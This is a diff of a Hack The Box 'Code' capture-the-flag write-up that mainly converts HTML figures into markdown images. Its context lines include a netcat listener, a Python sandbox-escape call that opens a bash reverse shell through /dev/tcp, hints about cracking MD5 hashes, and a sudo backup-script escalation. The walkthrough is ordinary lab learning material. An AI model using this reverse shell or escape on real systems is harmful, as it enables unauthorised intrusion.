@@ -79,10 +79,8 @@ We need first to establish a listener: `nc -lvnp 9001`. Then run this code:
 print(object.__subclasses__()[317](["bash", "-c", "bash -i >& /dev/tcp/<your-ip>/<your-port> 0>&1"]))
 ```
 
-<figure>
-  <img src="/src/content/posts/htb_m/images/code/8.png" alt="first flag">
-  <figcaption style="text-align: center;"> We successfully got a reverse shell </figcaption>
-</figure>
+We successfully got a reverse shell:
+![image](images/code/8.png)
 
 By executing the `ls` command to list the files in the dir, as you can see, we have the source code of our app: `app.py`
 
@@ -108,10 +106,9 @@ def register():
 
 The passwords from the registration page got MD5 hashed in the database, which we may crack it.
 Navigating further, you will find the first flag at the `/app-production` directory:
-<figure>
-  <img src="/src/content/posts/htb_m/images/code/10.png" alt="first flag">
-  <figcaption style="text-align: center;"> User Flag </figcaption>
-</figure>
+
+![image](images/code/10.png)
+
 
 But where is the second flag? Maybe we will find some creds that will help us get on the SSH server and get it?
 
@@ -219,7 +216,5 @@ The JSON file created will look like the following:
 ```
 You can then run the script on your file: `sudo /usr/bin/backy.sh testing.json`.
 
-<figure>
-  <img src="/src/content/posts/htb_m/images/code/13.png" alt="Second Flag">
-  <figcaption style="text-align: center;"> Root Flag </figcaption>
-</figure>
+Root Flag:
+![image](images/code/13.png)
